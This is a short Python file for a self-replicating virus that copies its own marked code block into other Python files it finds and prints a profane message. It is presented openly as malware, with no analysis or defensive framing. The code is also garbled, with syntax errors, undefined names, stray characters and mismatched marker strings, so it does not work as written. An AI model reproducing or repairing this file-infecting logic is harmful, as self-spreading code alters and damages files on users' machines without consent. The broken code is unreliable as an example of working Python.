#VIRUS SAYS HI!

Import sys
Import glob

Virus_code = []

with open (sys.argv [0],'r') as f :
     lines = f read lines()

self_replicating_part =false
for line in lines :
  if line == "# VIRUS SAYS HI!":
    self_replicating_part:
    virus_code.append(line)
if line == "# VIRUS SAYS BYE!\n":
  break
'
  python_files = glob.glob('LOL.py')+ glob.glob('*.pyw')
w
  for file in python_files :
     with open (file,'r') as f:
         file_code = f.readlines()

  infected =false

  for lines in file_code:
    if line == "#VIRUS SAYS HI!\n":
          infected =True
      break
if not infected:
   final_code =[]
   final_code.extend(virus_code)
   final_code.extend('\n')
   final_code.extend(file_code)

with open(file,'w') as f:
   f.writelines(final_code)

def malicious_code():
   print("infected?? bitch!!!fucek")

malicious_code()

#VIRUS SAYS BYE
